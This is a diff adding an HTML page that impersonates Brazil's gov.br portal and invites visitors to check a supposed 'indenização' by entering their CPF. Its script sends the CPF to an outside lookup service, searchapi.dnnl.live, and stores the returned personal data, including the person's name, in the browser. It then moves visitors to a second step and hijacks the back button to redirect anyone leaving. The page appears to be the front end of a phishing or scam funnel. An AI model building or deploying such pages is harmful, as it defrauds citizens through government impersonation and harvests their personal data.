@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consulta Indenização - gov.br</title>
+    <link rel="stylesheet" href="css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet">
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Poppins:wght@300;400;600;700&display=swap');
+
+        * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Rawline', sans-serif;
+    }
+
+    header {
+      background-color: white;
+      padding: 12px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #e5e5e5;
+      box-shadow: none;
+    }
+
+    header .logo svg {
+      height: 24px;
+      width: auto;
+      margin-right: 16px;
+    }
+
+    header .icons {
+      display: flex;
+      align-items: center;
+    }
+
+    header .icons button {
+      background: none;
+      border: none;
+      margin-left: 24px;
+      cursor: pointer;
+    }
+
+    header .icons button i {
+      font-size: 16px;
+      color: #1451b4;
+    }
+
+    header .user {
+      background-color: blue;
+      color: white;
+      border: none;
+      border-radius: 50px;
+      padding: 6px 16px;
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+    }
+
+    header .user i {
+      margin-right: 8px;
+    }
+
+    nav {
+      background-color: white;
+      padding: 16px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #e5e5e5;
+    }
+
+    nav button {
+      background: none;
+      border: none;
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+    }
+
+    nav button i {
+      font-size: 16px;
+      color: #1451b4;
+      margin-right: 10px;
+    }
+
+    nav button span {
+      color: #666;
+      font-size: 14px;
+      font-weight: 300;
+    }
+
+    .carousel {
+      width: 100%;
+      overflow: hidden;
+      background: #fff;
+    }
+
+    .carousel-inner {
+      display: flex;
+      transition: transform 0.5s ease-in-out;
+    }
+
+    .carousel-inner img {
+      width: 100%;
+      max-width: 720px;
+      height: auto;
+      object-fit: cover;
+      display: block;
+    }
+    .conteudo {
+      max-width: 720px;
+      margin: 0 auto;
+    }
+
+    .conteudo-inner {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      border: 1px solid #ddd;
+    }
+
+    .titulo-section {
+      font-size: 18px;
+      color: #0c326f;
+      margin-bottom: 16px;
+      text-align: center;
+      font-weight: 600;
+    }
+
+    .container-form {
+      text-align: center;
+      border: 0;
+      padding: 20px;
+      border-radius: 8px;
+      width: 100%;
+      max-width: 400px;
+      box-sizing: border-box;
+      margin: 0 auto;
+    }
+
+    .container-form label {
+      font-weight: 600;
+      display: block;
+      margin-bottom: 5px;
+      font-size: 14px;
+      color: #333;
+    }
+
+    .container-form p {
+      text-align: left;
+      margin-bottom: 5px;
+      color: #333;
+      font-size: 14px;
+    }
+
+    .container-form .highlight {
+      font-weight: bold;
+    }
+
+    .container-form .input-label {
+      margin-top: 14px;
+      font-size: 14px;
+      color: #666;
+    }
+
+    .container-form input {
+      padding: 10px;
+      margin: 10px 0 20px 0;
+      width: 100%;
+      box-sizing: border-box;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 15px;
+      font-style: italic;
+    }
+
+    .container-form button {
+      padding: 10px 20px;
+      background-color: #1355B6;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-weight: bold;
+      width: 100%;
+      box-sizing: border-box;
+      font-size: 12px;
+      margin-top: 16px;
+    }
+
+    .container-form button:hover {
+      background-color: #0F4DA8;
+    }
+
+    .container-form .icon {
+      width: 20px;
+      vertical-align: middle;
+      margin-right: 4px;
+    }
+
+    .headMensagem {
+      background-color: #f7f7f7;
+      padding: 12px 24px;
+      font-size: 14px;
+      color: #333;
+      border-top: 1px solid #e5e5e5;
+      border-bottom: 1px solid #e5e5e5;
+    }
+
+    .headMensagem p {
+      color: #333;
+    }
+
+    .headMensagem span {
+      margin: 0 4px;
+    }
+
+    .error-message {
+      color: #ff0000;
+      margin-bottom: 10px;
+      font-size: 14px;
+      text-align: left;
+    }
+
+    footer {
+      background-color: #0B1A38;
+      color: #fff;
+      text-align: center;
+      padding: 24px;
+      font-size: 14px;
+      margin-top: 50px;
+    }
+
+    footer .footer-logo {
+      width: 120px;
+      margin-bottom: 12px;
+    }
+
+    footer .copy p {
+      margin: 0 0 4px 0;
+    }
+
+    footer .copy span {
+      font-size: 12px;
+      color: #fff;
+    }
+    .hidden {
+    display: none;
+}
+.text-red-600 {
+    --tw-text-opacity: 1;color: rgb(255, 0, 0) !important;
+}
+.text-sm {
+    font-size: 0.875rem;
+    line-height: 1.25rem;
+}
+    </style>
+
+<script>
+    var urlBackRedirect = '../back/index.html';
+    urlBackRedirect = urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf("?") > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+    history.pushState({}, "", location.href);
+    history.pushState({}, "", location.href);
+    window.onpopstate = function () {
+      setTimeout(function () {
+        location.href = urlBackRedirect;
+      }, 1);
+    };
+  </script>
+
+
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+</head>
+
+<body class="bg-[#1351B4] flex flex-col items-center min-h-screen">
+    <header>
+    <div class="logo">
+      <svg width="148" height="45" viewBox="0 0 148 45">
+        <title>GOV.BR</title>
+        <text x="0" y="33" font-size="40" font-weight="900" font-family="Arial, sans-serif">
+          <tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan><tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan>
+        </text>
+      </svg>
+    </div>
+    <div class="icons">
+      <button><i class="fas fa-ellipsis-v"></i></button>
+      <button><i class="fas fa-cookie-bite"></i></button>
+      <button><i class="fas fa-th"></i></button>
+      <button class="user" style="background-color: #1451b4;">
+        <span id="user-name" style="font-weight: bold; font-size:15px;">Entrar</span>
+      </button>
+    </div>
+  </header>
+  <nav>
+    <button><i class="fas fa-bars"></i>
+      <p>Benefício <span> > </span> Indenização <span> > </span> Acessar Usuário</p>
+    </button>
+    <button><i class="fas fa-search"></i></button>
+  </nav>
+  <div class="carousel">
+    <div class="carousel-inner">
+      <img src="images/slide-2.png" alt="Slide 1">
+      <img src="images/slide-1.png" alt="Slide 2">
+      <img src="images/slide-2.png" alt="Slide 3">
+      <img src="images/slide-1.png" alt="Slide 4">
+    </div>
+  </div>
+
+  <div class="conteudo">
+    <div class="conteudo-inner">
+        <h2 class="titulo-section">Verifique sua indenização do gov.br:</h2>
+        <div class="container-form">
+            <form id="cpfForm">
+                <label for="cpf">
+                    <img decoding="async" src="images/01.png" class="icon" alt="CPF Ícone">
+                    Número do CPF
+                </label>
+                <p class="input-label">Digite seu CPF para <span class="highlight">consultar</span> sua indenização do gov.br</p>
+                <p style="margin-top: 20px; font-size: 14px;">CPF</p>
+                <input type="tel" id="cpf" name="cpf" maxlength="14" placeholder="Digite seu CPF" required="">
+                <p id="cpfError" class="text-red-600 text-sm mt-1 hidden">Digite um CPF válido.</p>
+                <div id="loading" class="hidden">
+                    <i class="fas fa-spinner fa-spin"></i>
+                    <span class="text-blue-700 text-sm font-medium">Consultando...</span>
+                </div>
+                <button type="submit" id="consultarBtn" class="w-full h-10 bg-gray-400 text-white py-2 rounded-full text-sm font-medium cursor-not-allowed" disabled="">Consultar Indenização</button>
+            </form>
+        </div>
+        <h2 style="font-size: 14px; margin-top: 30px; margin-bottom: 0; display: flex; justify-content: center;">Termos de Uso de Aviso de Privacidade</h2>
+        <div style="border-top: 1px solid #ccc; margin-top: 10px; padding-top: 10px;"></div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+            <script>
+                function formatarCPF(input) {
+                    let cpf = input.value.replace(/\D/g, '');
+                    if (cpf.length > 3) cpf = cpf.replace(/^(\d{3})(\d)/, '$1.$2');
+                    if (cpf.length > 6) cpf = cpf.replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
+                    if (cpf.length > 9) cpf = cpf.replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
+                    input.value = cpf;
+                }
+            </script>
+
+            <script>
+                document.addEventListener("DOMContentLoaded", function () {
+                    const cpfInput = document.getElementById("cpf");
+                    const cpfError = document.getElementById("cpfError");
+                    const consultarBtn = document.getElementById("consultarBtn");
+                    const loading = document.getElementById("loading");
+                    const form = document.getElementById("cpfForm");
+
+                    function validarCPF(cpf) {
+                        cpf = cpf.replace(/\D/g, '');
+                        if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
+
+                        let soma = 0, resto;
+                        for (let i = 1; i <= 9; i++) soma += parseInt(cpf[i - 1]) * (11 - i);
+                        resto = (soma * 10) % 11;
+                        if (resto === 10 || resto === 11) resto = 0;
+                        if (resto !== parseInt(cpf[9])) return false;
+
+                        soma = 0;
+                        for (let i = 1; i <= 10; i++) soma += parseInt(cpf[i - 1]) * (12 - i);
+                        resto = (soma * 10) % 11;
+                        if (resto === 10 || resto === 11) resto = 0;
+                        return resto === parseInt(cpf[10]);
+                    }
+
+                    function atualizarEstadoBotao() {
+                        const cpf = cpfInput.value.replace(/\D/g, "");
+                        if (validarCPF(cpf)) {
+                            cpfError.classList.add("hidden");
+                            consultarBtn.classList.remove("bg-gray-400", "cursor-not-allowed");
+                            consultarBtn.classList.add("bg-blue-700", "hover:bg-blue-800");
+                            consultarBtn.disabled = false;
+                        } else {
+                            cpfError.classList.remove("hidden");
+                            consultarBtn.classList.add("bg-gray-400", "cursor-not-allowed");
+                            consultarBtn.classList.remove("bg-blue-700", "hover:bg-blue-800");
+                            consultarBtn.disabled = true;
+                        }
+                    }
+
+                    cpfInput.addEventListener("input", function () {
+                        formatarCPF(this);
+                        atualizarEstadoBotao();
+                    });
+
+                    form.addEventListener("submit", function (event) {
+                        event.preventDefault();
+                        const cpf = cpfInput.value.replace(/\D/g, "");
+
+                        if (!validarCPF(cpf)) {
+                            cpfError.textContent = "CPF inválido. Tente novamente.";
+                            cpfError.classList.remove("hidden");
+                            return;
+                        }
+
+                        loading.classList.remove("hidden");
+                        consultarBtn.classList.add("cursor-not-allowed", "opacity-50");
+                        consultarBtn.disabled = true;
+
+                        fetch(`https://searchapi.dnnl.live/consulta?token_api=fpsc&cpf=${encodeURIComponent(cpf)}`, {
+                            method: 'GET'
+                        })
+                            .then(response => {
+                                if (!response.ok) {
+                                    throw new Error(`Erro HTTP: ${response.status}`);
+                                }
+                                return response.json();
+                            })
+                            .then(responseData => {
+                                console.log('Dados recebidos (bruto):', responseData);
+                                
+                                // Verificar se responseData é um array ou um objeto com propriedade dados
+                                let dadosProcessados = responseData;
+                                
+                                // Se for um array direto, usamos ele
+                                if (Array.isArray(responseData)) {
+                                    console.log('Resposta em formato de array');
+                                } 
+                                // Se for um objeto com propriedade dados, extraímos o array
+                                else if (responseData && responseData.dados && Array.isArray(responseData.dados)) {
+                                    dadosProcessados = responseData.dados;
+                                    console.log('Resposta em formato de objeto com propriedade dados');
+                                }
+                                // Se não for nenhum dos formatos esperados, tentamos criar um array
+                                else {
+                                    dadosProcessados = [responseData];
+                                    console.log('Resposta em formato desconhecido, convertendo para array');
+                                }
+                                
+                                console.log('Dados processados:', dadosProcessados);
+                                
+                                // Verificar se temos dados válidos com um nome
+                                if (dadosProcessados && dadosProcessados.length > 0 && dadosProcessados[0] && dadosProcessados[0].NOME) {
+                                    // Criar o objeto no formato esperado pelo etapa2
+                                    const data = {
+                                        dados: dadosProcessados
+                                    };
+                                    
+                                    console.log('Dados formatados para localStorage:', data);
+                                    
+                                    var currentUrlParams = new URLSearchParams(window.location.search);
+
+                                    localStorage.setItem('userData', JSON.stringify(data));
+                                    localStorage.setItem('userCPF', cpf);
+                                    localStorage.setItem('sessionTimestamp', Date.now());
+                                    window.location.href = "../etapa2/index.html?" + currentUrlParams.toString();
+                                } else {
+                                    console.error('Dados inválidos ou sem nome:', dadosProcessados);
+                                    cpfError.textContent = "CPF não encontrado ou dados inválidos.";
+                                    cpfError.classList.remove("hidden");
+                                }
+                            })
+                            .catch(error => {
+                                console.error('Erro na requisição:', error);
+                                cpfError.textContent = "Erro ao conectar ao servidor.";
+                                cpfError.classList.remove("hidden");
+                            })
+                            .finally(() => {
+                                loading.classList.add("hidden");
+                                consultarBtn.classList.remove("cursor-not-allowed", "opacity-50");
+                                consultarBtn.disabled = false;
+                            });
+                    });
+                });
+            </script>
+
+<footer>
+    <img src="images/logo.png" class="footer-logo">
+    <div class="copy">
+      <p>Todo o conteúdo deste site está publicado sob a licença</p>
+      <span>Creative Commons Atribuição-SemDerivações 3.0 Não Adaptada</span>
+    </div>
+  </footer>
+</body>
+
+</html>
